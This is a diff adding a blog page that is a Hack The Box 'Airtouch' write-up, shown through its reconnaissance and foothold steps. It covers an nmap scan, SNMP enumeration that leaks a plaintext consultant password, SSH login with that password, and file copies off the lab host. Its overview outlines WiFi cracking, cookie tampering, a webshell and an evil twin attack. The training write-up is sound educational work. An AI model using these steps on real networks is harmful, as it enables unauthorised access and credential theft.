@@ -1,0 +1,978 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Foued SAIDI">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://fouedsaidi.com/2026/04/18/hackthebox-airtouch/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="OverviewAirTouch is a medium-difficulty machine from Hack The Box that simulates a multi-AP corporate WiFi environment. We start by leaking the consultant’s SSH password through an open SNMP service,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackthebox: Airtouch">
+<meta property="og:url" content="http://fouedsaidi.com/2026/04/18/Hackthebox-Airtouch/index.html">
+<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
+<meta property="og:description" content="OverviewAirTouch is a medium-difficulty machine from Hack The Box that simulates a multi-AP corporate WiFi environment. We start by leaking the consultant’s SSH password through an open SNMP service,">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Airtouch/Airtouch.png">
+<meta property="article:published_time" content="2026-04-18T13:31:16.000Z">
+<meta property="article:modified_time" content="2026-04-18T16:26:57.049Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="SNMP">
+<meta property="article:tag" content="WiFi">
+<meta property="article:tag" content="WPA2-PSK">
+<meta property="article:tag" content="WPA2-Enterprise">
+<meta property="article:tag" content="aircrack-ng">
+<meta property="article:tag" content="EAPHammer">
+<meta property="article:tag" content="Evil Twin">
+<meta property="article:tag" content="MSCHAPv2">
+<meta property="article:tag" content="Cookie Tampering">
+<meta property="article:tag" content="File Upload">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Airtouch/Airtouch.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#5618ff">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Hackthebox: Airtouch -
+        
+        Foued Saidi&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI 👋","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":null,"zhihu":null,"twitter":"https://twitter.com/_kujen5","email":null,"linkedin":"https://www.linkedin.com/in/foued-saidi-pro/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Foued Saidi&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Airtouch</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/logo.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-04-18 16:31:16</span>
+        <span class="mobile">2026-04-18 16:31:16</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-04-18 19:26:57</span>
+            <span class="mobile">2026-04-18 19:26:57</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/SNMP/">SNMP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/WiFi/">WiFi</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/WPA2-PSK/">WPA2-PSK</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/WPA2-Enterprise/">WPA2-Enterprise</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/aircrack-ng/">aircrack-ng</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/EAPHammer/">EAPHammer</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Evil-Twin/">Evil Twin</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/MSCHAPv2/">MSCHAPv2</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Cookie-Tampering/">Cookie Tampering</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/File-Upload/">File Upload</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>AirTouch is a medium-difficulty machine from Hack The Box that simulates a multi-AP corporate WiFi environment. We start by leaking the consultant’s SSH password through an open SNMP service, land on a jump host equipped with multiple wireless interfaces, and capture a WPA2-PSK handshake from the <code>AirTouch-Internet</code> network. After cracking the PSK, we associate to the network, sniff decrypted HTTP traffic from the router admin panel, and hijack a session cookie. Tampering the <code>UserRole</code> cookie grants us admin access, where we abuse a file upload to drop a webshell and read credentials reused for SSH on the PSK access point. From there, we pivot to the WPA2-Enterprise <code>AirTouch-Office</code> network using <strong>EAPHammer</strong> to run an Evil Twin attack against <code>802.1X</code>, capture a MSCHAPv2 challenge&#x2F;response, crack it offline, and chain through two more access points to root.</p>
+<p><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/Airtouch/Airtouch.png"
+                      alt="Airtouch-info-card"
+                ><figcaption>Airtouch-info-card</figcaption></figure></p>
+<h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>We begin with a port scan against the target.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ nmap  -A -Pn 10.129.10.86</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-19 23:05 EST</span><br><span class="line">Nmap scan report for 10.129.10.86</span><br><span class="line">Host is up (0.35s latency).</span><br><span class="line">Not shown: 999 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 bd:90:00:15:cf:4b:da:cb:c9:24:05:2b:01:ac:dc:3b (RSA)</span><br><span class="line">|   256 6e:e2:44:70:3c:6b:00:57:16:66:2f:37:58:be:f5:c0 (ECDSA)</span><br><span class="line">|_  256 ad:d5:d5:f0:0b:af:b2:11:67:5b:07:5c:8e:85:76:76 (ED25519)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.19</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 8888/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   494.15 ms 10.10.16.1</span><br><span class="line">2   225.16 ms 10.129.10.86</span><br></pre></td></tr></table></figure></div>
+
+<p>Only SSH on port 22 is exposed via TCP. With nothing else to chew on, we move to UDP enumeration and try SNMP with the default <code>public</code> community string.</p>
+<h2 id="SNMP-Enumeration"><a href="#SNMP-Enumeration" class="headerlink" title="SNMP Enumeration"></a>SNMP Enumeration</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">$ snmpwalk -v2c -c public 10.129.10.86</span><br><span class="line">iso.3.6.1.2.1.1.1.0 = STRING: &quot;\&quot;The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)\&quot;&quot;</span><br><span class="line">iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10</span><br><span class="line">iso.3.6.1.2.1.1.3.0 = Timeticks: (3217286) 8:56:12.86</span><br><span class="line">iso.3.6.1.2.1.1.4.0 = STRING: &quot;admin@AirTouch.htb&quot;</span><br><span class="line">iso.3.6.1.2.1.1.5.0 = STRING: &quot;Consultant&quot;</span><br><span class="line">iso.3.6.1.2.1.1.6.0 = STRING: &quot;\&quot;Consultant pc\&quot;&quot;</span><br><span class="line">iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.4</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.50</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3</span><br><span class="line">iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.1 = STRING: &quot;The SNMP Management Architecture MIB.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.2 = STRING: &quot;The MIB for Message Processing and Dispatching.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.3 = STRING: &quot;The management information definitions for the SNMP User-based Security Model.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.4 = STRING: &quot;The MIB module for SNMPv2 entities&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.5 = STRING: &quot;View-based Access Control Model for SNMP.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.6 = STRING: &quot;The MIB module for managing TCP implementations&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.7 = STRING: &quot;The MIB module for managing IP and ICMP implementations&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.8 = STRING: &quot;The MIB module for managing UDP implementations&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.9 = STRING: &quot;The MIB modules for managing SNMP Notification, plus filtering.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.3.10 = STRING: &quot;The MIB module for logging SNMP Notifications.&quot;</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (0) 0:00:00.00</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (0) 0:00:00.00</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (0) 0:00:00.00</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (0) 0:00:00.00</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (0) 0:00:00.00</span><br><span class="line">iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (0) 0:00:00.00</span><br><span class="line">iso.3.6.1.2.1.25.1.1.0 = Timeticks: (3225513) 8:57:35.13</span><br><span class="line">iso.3.6.1.2.1.25.1.1.0 = No more variables left in this MIB View (It is past the end of the MIB tree)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>The <code>sysDescr</code> OID leaks the credentials in plaintext: <code>consultant : RxBlZhLmOkacNWScmZ6D</code>. We use them to SSH in.</p>
+<h2 id="Foothold-consultant"><a href="#Foothold-consultant" class="headerlink" title="Foothold - consultant"></a>Foothold - consultant</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ sshpass -p &#x27;RxBlZhLmOkacNWScmZ6D&#x27; ssh -o StrictHostKeyChecking=no consultant@10.129.10.86</span><br><span class="line">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that users do not log into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the &#x27;unminimize&#x27; command.</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">consultant@AirTouch-Consultant:~$ ls</span><br><span class="line">diagram-net.png  photo_2023-03-01_22-04-52.png</span><br><span class="line">consultant@AirTouch-Consultant:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>The home directory contains two images. Let’s pull them down for inspection.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">consultant@AirTouch-Consultant:~$ ll</span><br><span class="line">total 888</span><br><span class="line">drwxr-xr-x 1 consultant consultant   4096 Jan 20 04:07 ./</span><br><span class="line">drwxr-xr-x 1 root       root         4096 Jan 13 14:55 ../</span><br><span class="line">lrwxrwxrwx 1 consultant consultant      9 Mar 27  2024 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 consultant consultant    220 Feb 25  2020 .bash_logout</span><br><span class="line">-rw-r--r-- 1 consultant consultant   3771 Feb 25  2020 .bashrc</span><br><span class="line">drwx------ 2 consultant consultant   4096 Jan 20 04:07 .cache/</span><br><span class="line">-rw-r--r-- 1 consultant consultant    807 Feb 25  2020 .profile</span><br><span class="line">-rw-r--r-- 1 consultant consultant 131841 Mar 27  2024 diagram-net.png</span><br><span class="line">-rw-r--r-- 1 consultant consultant 743523 Mar 27  2024 photo_2023-03-01_22-04-52.png</span><br><span class="line">consultant@AirTouch-Consultant:~$ exit</span><br><span class="line">logout</span><br><span class="line">Connection to 10.129.10.86 closed.</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sshpass -p &#x27;RxBlZhLmOkacNWScmZ6D&#x27; scp -o StrictHostKeyChecking=no consultant@10.129.10.86:/home/consultant/diagram-net.png .</span><br><span class="line"></span><br><span class="line">$ sshpass -p &#x27;RxBlZhLmOkacNWScmZ6D&#x27; scp -o StrictHostKeyChecking=no consultant@10.129.10.86:/home/consultant/photo_2023-03-01_22-04-52.png .</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>![[Pasted image 20260120080251.png]]</p>
+<p>![[Pasted image 20260120080310.png]]</p>
+<p>The diagram shows the network topology — a consultant box with multiple wireless adapters, an internal <code>AirTouch-Internet</code> PSK access point, an <code>AirTouch-Office</code> enterprise access point, and a photo hinting at the SSIDs we should attack. With wireless interfaces on the host, this is clearly going to be a wireless-pentest box.</p>
+<h2 id="Wireless-Recon-AirTouch-Internet"><a href="#Wireless-Recon-AirTouch-Internet" class="headerlink" title="Wireless Recon - AirTouch-Internet"></a>Wireless Recon - AirTouch-Internet</h2><p>We escalate to root (the consultant box has unrestricted <code>sudo</code>) so we can manipulate the wireless interfaces and run <code>airodump-ng</code> to discover nearby APs.</p>
